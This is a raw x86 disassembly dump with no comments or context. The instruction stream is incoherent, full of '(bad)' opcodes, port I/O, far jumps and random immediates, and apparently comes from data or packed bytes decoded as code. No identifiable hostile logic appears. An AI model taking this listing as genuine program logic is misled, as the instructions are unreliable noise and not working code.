  422d81:	and    DWORD PTR [ebp+0x7a],esp
  422d84:	div    DWORD PTR [ebx+0x1]
  422d87:	add    BYTE PTR ds:0xdc000001,al
  422d8d:	add    DWORD PTR [eax-0x3c],ebx
  422d90:	xchg   esi,eax
  422d91:	sbb    BYTE PTR [edi],dl
  422d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d94:	jnp    0x422de0
  422d96:	sbb    dl,BYTE PTR [esi-0x4a]
  422d99:	sub    esi,DWORD PTR [ebp-0x25ce18f2]
  422d9f:	mov    eax,0xae45ca41
  422da4:	cs imul edi,ecx,0x12
  422da8:	ja     0x422d8a
  422daa:	jnp    0x422dc5
  422dac:	fs retf 0x3f8b
  422db0:	test   BYTE PTR [esi+0x53],dl
  422db3:	lods   eax,DWORD PTR ds:[esi]
  422db4:	test   eax,0x85fb086c
  422db9:	mov    ah,0x46
  422dbb:	push   edx
  422dbc:	test   DWORD PTR [edx],ebx
  422dbe:	mov    bl,0x72
  422dc0:	dec    edx
  422dc1:	jmp    0x422dcc
  422dc3:	pop    edx
  422dc4:	mov    cl,0x6a
  422dc6:	out    dx,eax
  422dc7:	push   ecx
  422dc8:	pop    esp
  422dc9:	cli    
  422dca:	call   0x1b74:0xa25896e5
  422dd1:	push   0x7c185e11
  422dd6:	bound  ebx,QWORD PTR [edx+0x7fce1ef0]
  422ddc:	imul   DWORD PTR [ecx+ecx*2-0x1a5b6c33]
  422de3:	in     eax,0x19
  422de5:	mov    BYTE PTR [esi],bh
  422de7:	or     BYTE PTR [eax-0x64b671e6],bh
  422ded:	cwde   
  422dee:	mov    ecx,0x53582cdb
  422df3:	inc    eax
  422df4:	pop    es
  422df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422df6:	into   
  422df7:	and    BYTE PTR [eax+0x54],ah
  422dfa:	or     eax,0xa3deae1f
  422dff:	js     0x422de2
  422e01:	cmp    al,0xe0
  422e03:	dec    esi
  422e04:	int3   
  422e05:	hlt    
  422e06:	pop    ss
  422e07:	jb     0x422d8e
  422e09:	or     al,0x95
  422e0b:	enter  0xcdd0,0xb2
  422e0f:	popa   
  422e10:	fbstp  TBYTE PTR [ecx]
  422e12:	ds into 
  422e14:	push   edx
  422e15:	and    esp,DWORD PTR [eax+0x6795bde0]
  422e1b:	xor    DWORD PTR [ebx-0x217f5306],edx
  422e21:	fisub  DWORD PTR [eax+0x3c]
  422e24:	cmp    eax,0xe21166cf
  422e29:	add    eax,DWORD PTR [ebx+0x6f77c2f6]
  422e2f:	pop    edi
  422e30:	test   DWORD PTR [esi],ecx
  422e32:	dec    edi
  422e33:	retf   
  422e34:	push   es
  422e35:	dec    esi
  422e36:	lock cmp dh,BYTE PTR [ecx]
  422e39:	xor    al,BYTE PTR [ebp+edi*4+0x65]
  422e3d:	mov    al,cl
  422e3f:	sub    ah,BYTE PTR [edx+ebp*8]
  422e42:	dec    esp
  422e43:	mov    bh,0xfe
  422e45:	imul   DWORD PTR [ecx]
  422e47:	push   es
  422e48:	push   edi
  422e49:	pop    ss
  422e4a:	xor    DWORD PTR [edx-0x6e2b4fd3],edi
  422e50:	dec    ebp
  422e51:	mov    al,0xad
  422e53:	ror    dl,0x9b
  422e56:	pop    ebx
  422e57:	cld    
  422e58:	test   bh,0xf7
  422e5b:	das    
  422e5c:	fadd   QWORD PTR [ebx-0x78f284c0]
  422e62:	fistp  QWORD PTR [ecx+ebx*1+0x1]
  422e66:	cmp    BYTE PTR [eax-0x7c],0xbe
  422e6a:	xor    al,0xd5
  422e6c:	test   BYTE PTR [edi],ch
  422e6e:	xchg   esp,eax
  422e6f:	fisttp QWORD PTR [ebx-0x2577ccc0]
  422e75:	dec    ebp
  422e76:	das    
  422e77:	ds ss dec eax
  422e7a:	mov    bh,0x8d
  422e7c:	xchg   edx,eax
  422e7d:	int    0xb5
  422e7f:	jmp    FWORD PTR [eax]
  422e81:	inc    esi
  422e82:	push   ebp
  422e83:	push   0xffffff8c
  422e85:	xor    DWORD PTR [edx+esi*4+0x50a3e4b3],esi
  422e8c:	icebp  
  422e8d:	lds    eax,FWORD PTR [ebp+0x23da]
	...
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x17db
  422f02:	add    eax,0x174fcc4
  422f07:	add    BYTE PTR ds:0x61000001,al
  422f0d:	cmp    eax,0x5b8ee353
  422f12:	outs   dx,BYTE PTR ds:[esi]
  422f13:	out    0x68,eax
  422f15:	jbe    0x422f65
  422f17:	push   edx
  422f18:	cli    
  422f19:	and    al,0xff
  422f1b:	pop    eax
  422f1c:	retf   0x13d8
  422f1f:	gs cmp eax,0xf146361d
  422f25:	out    0xa0,al
  422f27:	pop    es
  422f28:	sahf   
  422f29:	pop    esp
  422f2a:	pop    esi
  422f2b:	ret    
  422f2c:	push   edi
  422f2d:	je     0x422f42
  422f2f:	xor    al,0xca
  422f31:	mov    esi,0xb9402dd3
  422f36:	pop    eax
  422f37:	sbb    ah,BYTE PTR [eax-0x73b64f01]
  422f3d:	pop    edi
  422f3e:	sub    eax,0x2dbc3f8
  422f43:	add    BYTE PTR [edx-0x50],dl
  422f46:	lahf   
  422f47:	mov    ebx,0xe50a99e4
  422f4c:	jmp    0x422f2d
  422f4e:	in     al,dx
  422f4f:	test   eax,0x70b34b44
  422f54:	cs fwait
  422f56:	into   
  422f57:	cs fwait
  422f59:	jp     0x422f49
  422f5b:	cli    
  422f5c:	jbe    0x422f35
  422f5e:	jo     0x422f7f
  422f60:	sbb    BYTE PTR [eax+ebx*4],dh
  422f63:	iret   
  422f64:	xchg   DWORD PTR [ebx+0x45],ebx
  422f67:	xor    ebp,edi
  422f69:	jns    0x422f8c
  422f6b:	popa   
  422f6c:	bound  edx,QWORD PTR [ebx-0x2206c930]
  422f72:	pop    ss
  422f73:	icebp  
  422f74:	je     0x422f4a
  422f76:	mov    eax,ds:0x586a9cc8
  422f7b:	out    dx,eax
  422f7c:	shl    DWORD PTR [edi],1
  422f7e:	in     eax,0x7
  422f80:	jbe    0x422f3e
  422f82:	add    eax,0x5e61d959
  422f87:	mov    al,0x55
  422f89:	pop    ebx
  422f8a:	in     al,0x1a
  422f8c:	add    BYTE PTR [ebx-0x69bdc2c0],cl
  422f92:	add    al,0x53
  422f94:	aam    0x75
  422f96:	mov    edi,ecx
  422f98:	(bad)  
  422f99:	stos   DWORD PTR es:[edi],eax
  422f9a:	mov    edi,0xdf3ed0d6
  422f9f:	jns    0x422fb4
  422fa1:	push   0xffffffc5
  422fa3:	lods   eax,DWORD PTR ds:[esi]
  422fa4:	xchg   esi,eax
  422fa5:	add    al,0x59
  422fa7:	cmp    eax,0xf8939d84
  422fac:	pushf  
  422fad:	ficom  WORD PTR [eax+0x15]
  422fb0:	or     DWORD PTR [ecx-0x166a0ec1],edx
  422fb6:	mov    ds,WORD PTR [edi]
  422fb8:	ret    
  422fb9:	or     eax,0x9fa7d09f
  422fbe:	pop    ecx
  422fbf:	cdq    
  422fc0:	ja     0x423022
  422fc2:	sub    BYTE PTR [ecx-0x1332ee89],bl
  422fc8:	mov    DWORD PTR [edi+0x61],edi
  422fcb:	mov    edi,0x25adceb2
  422fd0:	aad    0xc
  422fd2:	inc    edx
  422fd3:	xlat   BYTE PTR ds:[ebx]
  422fd4:	pushf  
  422fd5:	(bad)  
  422fd6:	iret   
  422fd7:	xchg   BYTE PTR [ebp+0x26],al
  422fda:	je     0x422f6e
  422fdc:	push   esp
  422fdd:	fld    QWORD PTR [eax+0x24]
  422fe0:	dec    esp
  422fe1:	or     BYTE PTR [ebp-0x8f95fa1],dh
  422fe7:	jecxz  0x422f8a
  422fe9:	add    ecx,DWORD PTR ds:0x1228cc0
  422fef:	lahf   
  422ff0:	sti    
  422ff1:	jmp    0x5c12:0x55a29050
  422ff8:	ret    0xbc32
  422ffb:	(bad)  
  422ffc:	retf   0x6337
  422fff:	jge    0x422f81
  423001:	dec    ecx
  423002:	cmovb  edx,DWORD PTR [ecx+esi*2-0x51]
  423007:	pop    esp
  423008:	pop    edi
  423009:	push   ecx
  42300a:	xor    BYTE PTR [edx-0x56],dl
  42300d:	dec    edx
  42300e:	das    
  42300f:	test   eax,0x18
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [esi+edx*2+0x18ebca9],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x21000001,al
  42308d:	pop    ecx
  42308e:	fcomp  QWORD PTR [edi+0x7c]
  423091:	lahf   
  423092:	call   FWORD PTR [edx-0x25a4cd10]
  423098:	nop
  423099:	add    eax,ecx
  42309b:	add    bl,BYTE PTR [ecx]
  42309d:	push   esi
  42309e:	mov    eax,0x171b941e
  4230a3:	sbb    al,0x33
  4230a5:	mov    esp,0x4ef5f7ff
  4230aa:	xor    edx,DWORD PTR [ebp+0x5ee7c990]
  4230b0:	(bad)  
  4230b1:	sar    DWORD PTR [ebx-0x7a],cl
  4230b4:	xchg   edi,eax
  4230b5:	ret    
  4230b6:	dec    ecx
  4230b7:	and    DWORD PTR [ebx],ecx
  4230b9:	dec    edi
  4230ba:	xor    BYTE PTR [esi+ebp*4-0x50],dh
  4230be:	sbb    esp,DWORD PTR [ecx+0x2529e11a]
  4230c4:	push   DWORD PTR [esi+ebp*8+0x49]
  4230c8:	lods   eax,DWORD PTR ds:[esi]
  4230c9:	adc    esp,DWORD PTR [esi]
  4230cb:	inc    edx
  4230cc:	cmp    eax,0x2b59e104
  4230d1:	arpl   WORD PTR [ebx],ax
  4230d3:	push   esi
  4230d4:	jb     0x42314c
  4230d6:	inc    ah
  4230d8:	inc    esi
  4230d9:	add    BYTE PTR [eax-0xd],bh
  4230dc:	xchg   ecx,eax
  4230dd:	push   esi
  4230de:	mov    ebp,0x33f1dea8
  4230e3:	in     eax,dx
  4230e4:	xchg   DWORD PTR ds:0x58094c70,eax
  4230ea:	(bad)
  4230ed:	adc    eax,0x7e2b7642
  4230f2:	(bad)  
  4230f3:	xchg   ecx,eax
  4230f4:	popa   
  4230f5:	clc    
  4230f6:	push   es
  4230f7:	xchg   ecx,eax
  4230f8:	hlt    
  4230f9:	iret   
  4230fa:	dec    edx
  4230fb:	jnp    0x423110
  4230fd:	and    eax,0x804b1fc3
  423102:	xchg   edx,eax
  423103:	jns    0x4230da
  423105:	cmc    
  423106:	(bad)  
  423107:	jl     0x42317c
  423109:	hlt    
  42310a:	enter  0x98a7,0x96
  42310e:	lea    ecx,[ebp-0x1a]
  423111:	loope  0x4230f2
  423113:	int3   
  423114:	cmp    ah,al
  423116:	dec    ecx
  423117:	mov    cl,0xb1
  423119:	stos   BYTE PTR es:[edi],al
  42311a:	sbb    eax,0x7d2bee8
  42311f:	push   es
  423120:	cmp    eax,0x77a192c2
  423125:	scas   al,BYTE PTR es:[edi]
  423126:	fistp  WORD PTR [ebx]
  423128:	jmp    0x42312d
  42312a:	xor    eax,0x9b8a2ac1
  42312f:	mov    ds:0x6087317b,al
  423134:	scas   eax,DWORD PTR es:[edi]
  423135:	aas    
  423136:	push   esp
  423137:	ins    BYTE PTR es:[edi],dx
  423138:	into   
  423139:	imul   ebp,DWORD PTR [eax],0xffffff9e
  42313c:	sub    BYTE PTR [esi-0x589604d5],ah
  423142:	adc    al,0xb2
  423144:	mov    bl,BYTE PTR [eax+0x79768069]
  42314a:	mov    ah,0x7e
  42314c:	test   edx,ebp
  42314e:	(bad)  
  42314f:	cmp    bh,BYTE PTR [esp+ebp*8]
  423152:	mov    bl,0xd5
  423154:	mov    bh,0x95
  423156:	aaa    
  423157:	or     eax,0x57f3ad50
  42315c:	test   bl,ah
  42315e:	loopne 0x4231bb
  423160:	fs pop esi
  423162:	in     al,dx
  423163:	(bad)  
  423164:	jmp    0xff5f:0xadf183d0
  42316b:	xrelease mov BYTE PTR [edi+0x20a0c7f],dh
  423172:	and    dl,BYTE PTR [ebx+0x12e1aaf8]
  423178:	sub    al,0x9f
  42317a:	mov    ds:0x18bffceb,al
  42317f:	shl    DWORD PTR [ecx-0x748651a2],cl
  423185:	pop    ebp
  423186:	mov    al,ds:0x1e828ea3
  42318b:	dec    ebp
  42318c:	out    dx,eax
  42318d:	rol    DWORD PTR ds:0xfdfd,1
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x54c5efea],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x12000001,al
  42320d:	add    bl,ah
  42320f:	cmp    DWORD PTR [ecx],edx
  423211:	jle    0x423202
  423213:	mov    DWORD PTR [ebp+ebp*2-0x2deba333],ebp
  42321a:	mov    cl,0x84
  42321c:	and    DWORD PTR [eax+0x1c],ebp
  42321f:	mov    eax,eax
  423221:	test   BYTE PTR [esp+ebx*8-0x19],0x88
  423226:	cmp    DWORD PTR [ecx+0x68],esi
  423229:	ins    DWORD PTR es:[edi],dx
  42322a:	jle    0x4231fa
  42322c:	data16 push bx
  42322f:	adc    al,0x19
  423231:	ss xor eax,0xd426f165
  423237:	fwait
  423238:	cwde   
  423239:	mov    WORD PTR [eax+0x9747424],?
  42323f:	push   ebx
  423240:	fdiv   QWORD PTR [ebx]
  423242:	scas   al,BYTE PTR es:[edi]
  423243:	mov    DWORD PTR ds:0x2c81f1b7,esi
  423249:	adc    esp,DWORD PTR [edx]
  42324b:	push   0xffffffdd
  42324d:	fcmovnb st,st(5)
  42324f:	sub    BYTE PTR [ebp+0x557cc2d3],cl
  423255:	test   BYTE PTR [ebp+edi*8-0x50f50144],cl
  42325c:	xor    ecx,DWORD PTR [esi+0x51]
  42325f:	test   BYTE PTR [eax+0x3973d29d],0x52
  423266:	jo     0x4232d8
  423268:	cmc    
  423269:	push   ecx
  42326a:	pop    eax
  42326b:	xor    bl,cl
  42326d:	mov    bh,0x5e
  42326f:	or     BYTE PTR [ebp+0x23be2d1b],ah
  423275:	jo     0x42326b
  423277:	arpl   WORD PTR [esp+ebx*1-0xb175f36],ax
  42327e:	test   BYTE PTR [edx-0x3c],0x47
  423282:	dec    ecx
  423283:	inc    ebp
  423284:	rcl    ebp,1
  423286:	inc    edi
  423287:	jne    0x42329b
  423289:	repnz mov eax,0x95d40fac
  42328f:	popa   
  423290:	cmp    DWORD PTR [ebp+0x13],ebp
  423293:	jp     0x4232f3
  423295:	cwde   
  423296:	sbb    edx,ebp
  423298:	dec    esp
  423299:	mov    al,ds:0x540c9f58
  42329e:	pop    ecx
  42329f:	jp     0x423305
  4232a1:	call   0x5a4fac7d
  4232a6:	pop    ds
  4232a7:	in     al,0x8e
  4232a9:	dec    edx
  4232aa:	push   edx
  4232ab:	seta   BYTE PTR [esi+esi*2+0x36477d03]
  4232b3:	push   ebp
  4232b4:	inc    edi
  4232b5:	imul   BYTE PTR [ebx+0x756016c6]
  4232bb:	cmp    ch,0x51
  4232be:	sbb    al,0x5
  4232c0:	sbb    al,0xf3
  4232c2:	mov    al,0xca
  4232c4:	xor    dh,BYTE PTR ds:0x1bf5c928
  4232ca:	(bad)  
  4232cc:	mov    dl,0x67
  4232ce:	imul   ebp,edi,0x44
  4232d1:	clc    
  4232d2:	das    
  4232d3:	sbb    DWORD PTR [eax-0x5b],esi
  4232d6:	out    dx,al
  4232d7:	loop   0x4232e5
  4232d9:	add    eax,0x671b915c
  4232de:	in     al,0xc4
  4232e0:	sbb    bl,BYTE PTR [eax+0x77af6f87]
  4232e6:	les    esp,FWORD PTR [ecx]
  4232e8:	cld    
  4232e9:	cmp    BYTE PTR [ecx+edi*4],0x63
  4232ed:	pop    eax
  4232ee:	cmp    BYTE PTR [edi+0x52afab35],bh
  4232f4:	popf   
  4232f5:	cs cmp al,0xe4
  4232f8:	xor    cl,0xfc
  4232fb:	pop    esp
  4232fc:	mov    ah,0x41
  4232fe:	mov    ch,0x76
  423300:	xchg   edi,eax
  423301:	fistp  QWORD PTR [ebx]
  423303:	mov    esi,0xba70616f
  423308:	js     0x4232c4
  42330a:	and    al,BYTE PTR [ebx]
  42330c:	loopne 0x4232aa
  42330e:	shr    DWORD PTR [ecx+0x3],1
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x63bf0f44
  423382:	sbb    al,0x14
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0x1a000001,al
  42338d:	push   eax
  42338e:	or     al,0x31
  423390:	jb     0x4233af
  423392:	add    BYTE PTR [esp+esi*2+0x2e],bl
  423396:	nop
  423397:	mov    cl,0xf4
  423399:	push   esi
  42339a:	inc    ebx
  42339b:	inc    edi
  42339c:	xchg   ebp,eax
  42339d:	mov    eax,ds:0x6d69e693
  4233a2:	(bad)  
  4233a3:	cdq    
  4233a4:	push   ecx
  4233a5:	fcmovnu st,st(5)
  4233a7:	cmp    cl,BYTE PTR [edi+0x57]
  4233aa:	les    esi,FWORD PTR [esi+ebp*4]
  4233ad:	xor    ecx,esp
  4233af:	jo     0x4233e7
  4233b1:	pop    ecx
  4233b2:	cmp    dh,BYTE PTR [edx]
  4233b4:	cmp    BYTE PTR [edx],dl
  4233b6:	push   edi
  4233b7:	xor    DWORD PTR [edi+ebx*1-0x32],edx
  4233bb:	sbb    ecx,DWORD PTR [ebx+0x60]
  4233be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233bf:	lahf   
  4233c0:	mov    dh,0xbc
  4233c2:	stos   DWORD PTR es:[edi],eax
  4233c3:	fs fdiv st,st(5)
  4233c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233c7:	mov    cl,0xc1
  4233c9:	(bad)  
  4233cc:	xor    esp,DWORD PTR [eax-0x38dfba33]
  4233d2:	mov    dl,0x18
  4233d5:	push   esp
  4233d6:	push   0xdf03c28
  4233db:	lahf   
  4233dc:	dec    edx
  4233dd:	pop    ss
  4233de:	jmp    0x423422
  4233e0:	inc    ebp
  4233e1:	mov    bh,0xc5
  4233e3:	lea    esp,[eax-0x7312a586]
  4233e9:	jae    0x423425
  4233eb:	call   0x89abcf0b
  4233f0:	mov    ecx,0x449f6622
  4233f5:	or     esi,ecx
  4233f7:	outs   dx,BYTE PTR ds:[esi]
  4233f8:	aam    0x25
  4233fa:	push   ecx
  4233fb:	push   es
  4233fc:	fsub   QWORD PTR [ebp+0x78b333]
  423402:	push   edi
  423403:	jns    0x423478
  423405:	pusha  
  423406:	push   edx
  423407:	int    0x2a
  423409:	scas   al,BYTE PTR es:[edi]
  42340a:	out    dx,eax
  42340b:	jmp    0x42338e
  42340d:	and    ah,0x7a
  423410:	lea    esp,[ebp+0x2b]
  423413:	mov    edx,0x5c7f1a8f
  423418:	pop    ebp
  423419:	daa    
  42341a:	xchg   ebp,eax
  42341b:	cld    
  42341c:	jns    0x4233f0
  42341e:	call   0x6c7cc5ad
  423423:	imul   edx,DWORD PTR [esi-0x45],0x6a8a85e5
  42342a:	mov    ebp,0xd561ab1f
  42342f:	mov    ch,0xa1
  423431:	dec    eax
  423432:	cli    
  423433:	push   esp
  423434:	jecxz  0x4233ed
  423436:	jns    0x4234a4
  423438:	push   0xf2c8d61c
  42343d:	pcmpgtb mm6,mm2
  423440:	sub    esi,DWORD PTR [edi]
  423442:	add    edx,ecx
  423444:	sar    DWORD PTR fs:[esp+ecx*2],1
  423448:	push   ds
  423449:	fst    st(2)
  42344b:	mov    bh,0x17
  42344d:	and    dh,BYTE PTR [ebx+0x20494ee8]
  423453:	ins    BYTE PTR es:[edi],dx
  423454:	add    ch,0x1e
  423457:	or     eax,0x39d4f067
  42345c:	(bad)  
  42345d:	jmp    0xd13062a9
  423462:	mov    cl,0xe8
  423464:	jg     0x423492
  423466:	push   0x4c
  423468:	pop    ebp
  423469:	jns    0x4234ab
  42346b:	xchg   edi,eax
  42346c:	icebp  
  42346d:	xor    esi,eax
  42346f:	mov    eax,0x507c2ecb
  423474:	cmp    BYTE PTR [esi],bl
  423476:	pop    esi
  423477:	(bad)  
  423478:	sahf   
  423479:	shr    DWORD PTR [ecx+edx*1-0x21011bb5],1
  423480:	mov    al,ds:0x3913c951
  423485:	cmp    BYTE PTR [ecx-0x51],bh
  423488:	pop    esp
  423489:	retf   
  42348a:	pushf  
  42348b:	mov    ebx,0xad7611b
  423490:	inc    edi
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xb71f:0xadf467bf
  423501:	das    
  423502:	les    esp,FWORD PTR [eax+edx*1]
  423505:	jns    0x423508
  423507:	add    BYTE PTR ds:0x7c000001,al
  42350d:	and    BYTE PTR [eax],bh
  42350f:	jmp    ecx
  423511:	adc    DWORD PTR [esi+0xf566034],0xd6f3b64c
  42351b:	jmp    FWORD PTR [ecx]
  42351d:	adc    ebp,DWORD PTR [edx+0x5c]
  423520:	jne    0x423509
  423522:	fs cs fs sub ch,0x4a
  423528:	pop    ss
  423529:	sub    ebp,DWORD PTR [edi-0x705ead6a]
  42352f:	xor    BYTE PTR [ecx],0x3f
  423532:	add    ah,cl
  423534:	fdivr  DWORD PTR fs:[edi]
  423537:	fwait
  423538:	cmp    DWORD PTR [ebp-0x3bef078d],0xffffffa0
  42353f:	lock pop ebx
  423541:	and    edi,DWORD PTR [ecx-0x6708a951]
  423547:	mov    eax,ds:0x8de76073
  42354c:	add    al,0xa2
  42354e:	add    eax,0xba6ee67a
  423553:	loop   0x4234e5
  423555:	mov    ebx,0x96f9dba3
  42355a:	inc    ecx
  42355b:	xchg   ebp,eax
  42355c:	mov    eax,ds:0xbf89607b
  423561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423562:	stos   BYTE PTR es:[edi],al
  423563:	and    dh,BYTE PTR ds:0x6341cbef
  423569:	rep ins BYTE PTR es:[edi],dx
  42356b:	jg     0x4234fc
  42356d:	es push ecx
  42356f:	cwde   
  423570:	xchg   ecx,eax
  423571:	and    al,0x8e
  423573:	push   es
  423574:	lahf   
  423575:	scas   eax,DWORD PTR es:[edi]
  423576:	out    dx,eax
  423577:	cmp    bh,BYTE PTR [ecx]
  423579:	xchg   ebx,eax
  42357a:	in     eax,0xc3
  42357c:	inc    edi
  42357d:	xchg   esp,eax
  42357e:	mov    ds:0x2e9fc7cd,eax
  423583:	push   edi
  423584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423585:	dec    edx
  423586:	mov    bl,0xd5
  423588:	jecxz  0x423514
  42358a:	cdq    
  42358b:	(bad)  
  42358c:	lahf   
  42358d:	(bad)  
  42358e:	out    0xe8,eax
  423590:	fadd   QWORD PTR [ebx-0x59]
  423593:	sub    dh,al
  423595:	xchg   esp,eax
  423596:	mov    WORD PTR [ebx+0x5b],?
  423599:	sub    eax,0x6eecfc43
  42359e:	mov    DWORD PTR [edi+ebp*1-0x55e7b603],ebp
  4235a5:	mov    WORD PTR ds:0x723b88c3,ss
  4235ab:	pop    esi
  4235ac:	jp     0x423549
  4235ae:	shl    BYTE PTR [edi-0x3a],cl
  4235b1:	outs   dx,BYTE PTR ds:[esi]
  4235b2:	pop    ecx
  4235b3:	mov    ebx,0x15f9769d
  4235b8:	jecxz  0x42360b
  4235ba:	aam    0x4a
  4235bc:	in     al,dx
  4235bd:	aas    
  4235be:	xor    eax,0xfb62a7c8
  4235c3:	jg     0x4235b5
  4235c5:	scas   eax,DWORD PTR es:[edi]
  4235c6:	inc    ebp
  4235c7:	aad    0xf5
  4235c9:	inc    esp
  4235ca:	and    ebp,DWORD PTR [ecx]
  4235cc:	jecxz  0x423598
  4235ce:	loop   0x42359b
  4235d0:	add    al,0xb0
  4235d2:	dec    esi
  4235d3:	jae    0x423555
  4235d5:	fimul  DWORD PTR [eax-0x3e]
  4235d8:	sbb    esp,ebp
  4235da:	and    BYTE PTR [ebx-0x73221837],ch
  4235e0:	out    0x27,al
  4235e2:	xor    ebp,DWORD PTR [eax-0x2e9a281c]
  4235e8:	push   cs
  4235e9:	push   edi
  4235ea:	rcl    esi,cl
  4235ec:	sti    
  4235ed:	and    BYTE PTR [ecx-0x41c77bcc],al
  4235f3:	jle    0x423586
  4235f5:	lods   eax,DWORD PTR ds:[esi]
  4235f6:	dec    edi
  4235f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235f8:	call   0xc255:0xb4968dfe
  4235ff:	cdq    
  423600:	cwde   
  423601:	push   es
  423602:	pop    ds
  423603:	push   edx
  423604:	call   0xc2e1b540
  423609:	sub    DWORD PTR [esi+0xc],eax
  42360c:	call   0x0:0xb292df4a
	...
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0xeff79213
  423683:	(bad)  
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    BYTE PTR [ecx+0x6e],ah
  42368e:	mov    eax,edi
  423690:	xchg   edi,eax
  423691:	fcomp  st(3)
  423693:	sbb    bh,BYTE PTR [edi-0x6e]
  423696:	pop    ebx
  423697:	(bad)  
  423699:	scas   eax,DWORD PTR es:[edi]
  42369a:	or     BYTE PTR [ecx+0x64],ch
  42369d:	or     BYTE PTR [ecx],cl
  42369f:	shl    BYTE PTR [edi-0x44b29cd],0x4a
  4236a6:	push   0x97c8f1aa
  4236ab:	jge    0x4236a2
  4236ad:	fmul   DWORD PTR [esi]
  4236af:	jle    0x423713
  4236b1:	aas    
  4236b2:	sbb    bl,bh
  4236b4:	loop   0x423673
  4236b6:	lods   al,BYTE PTR ds:[esi]
  4236b7:	inc    esi
  4236b8:	push   esp
  4236b9:	call   0x3a5c145e
  4236be:	iret   
  4236bf:	lds    ebx,FWORD PTR [edi+0x2b7606d0]
  4236c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236c6:	rcr    BYTE PTR [esi+ebx*2+0x5b9c0e1f],cl
  4236cd:	les    edi,FWORD PTR [ecx-0x58]
  4236d0:	ror    DWORD PTR [edx+edi*2],1
  4236d3:	fidivr DWORD PTR [edi+0x61]
  4236d6:	push   ebx
  4236d7:	stc    
  4236d8:	adc    DWORD PTR [ebx+eax*1-0x41],esi
  4236dc:	push   esi
  4236dd:	mov    al,0x5a
  4236df:	cmp    al,BYTE PTR cs:[edi+0x64d23d01]
  4236e6:	pop    ecx
  4236e7:	or     cl,cl
  4236e9:	data16 xlat BYTE PTR ds:[ebx]
  4236eb:	nop
  4236ec:	cmp    BYTE PTR [edi+0x11f8ca42],bh
  4236f2:	repz popf 
  4236f4:	sub    ch,BYTE PTR [ecx-0x78]
  4236f7:	cmp    bl,ah
  4236f9:	mov    bh,0xdb
  4236fb:	jecxz  0x4236c6
  4236fd:	and    edi,DWORD PTR [edi+0x29]
  423700:	push   es
  423701:	inc    ebx
  423702:	pop    ss
  423703:	pop    esp
  423704:	xchg   ecx,eax
  423705:	jp     0x423717
  423707:	imul   ecx,DWORD PTR fs:[edi+0x1e108245],0xe920706b
  423712:	dec    ecx
  423713:	push   0xffffffae
  423715:	lods   al,BYTE PTR ds:[esi]
  423716:	dec    esp
  423717:	adc    ecx,DWORD PTR [ecx]
  423719:	in     al,dx
  42371a:	cs rol BYTE PTR fs:[ebx],0x8
  42371f:	or     ch,BYTE PTR [edx+0x22]
  423722:	(bad)  
  423723:	rep ins BYTE PTR es:[edi],dx
  423725:	outs   dx,DWORD PTR ds:[esi]
  423726:	jae    0x4236fd
  423728:	push   0x2819c390
  42372d:	and    cl,0xdc
  423730:	je     0x4236b7
  423732:	and    DWORD PTR [ecx+0x38],eax
  423735:	aaa    
  423736:	push   eax
  423737:	sub    eax,0x5a10fe5
  42373c:	lahf   
  42373d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42373f:	pop    edi
  423740:	mov    esp,DWORD PTR [edi+eax*2]
  423743:	hlt    
  423744:	mov    cl,0x8e
  423746:	mov    bh,0x45
  423748:	sub    ah,BYTE PTR [edx+eax*8+0x6d]
  42374c:	imul   ecx,DWORD PTR [eax+0x68e1dd24],0x7f673b2b
  423756:	dec    eax
  423757:	ins    DWORD PTR es:[edi],dx
  423758:	xor    DWORD PTR [ebp-0x75],ebp
  42375b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42375c:	cli    
  42375d:	and    al,0xce
  42375f:	scas   al,BYTE PTR es:[edi]
  423760:	inc    ecx
  423761:	push   edi
  423762:	xor    BYTE PTR [ebx],ah
  423764:	pop    esp
  423765:	mov    bh,0x4
  423767:	leave  
  423768:	jne    0x4237cb
  42376a:	daa    
  42376b:	push   ecx
  42376c:	and    edx,esp
  42376e:	push   ds
  42376f:	fdivr  DWORD PTR [esi]
  423771:	je     0x42378a
  423773:	sbb    DWORD PTR [edi*1-0x3d760762],ebp
  42377a:	lods   eax,DWORD PTR ds:[esi]
  42377b:	jnp    0x423776
  42377d:	bound  eax,QWORD PTR [esi+0x33]
  423780:	int3   
  423781:	and    ebp,DWORD PTR [edx+ebp*4-0x4b]
  423785:	idiv   esi
  423787:	hlt    
  423788:	jne    0x42378b
  42378a:	cdq    
  42378b:	in     al,0x97
  42378d:	mov    dl,0x49
  42378f:	mov    ds,esp
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
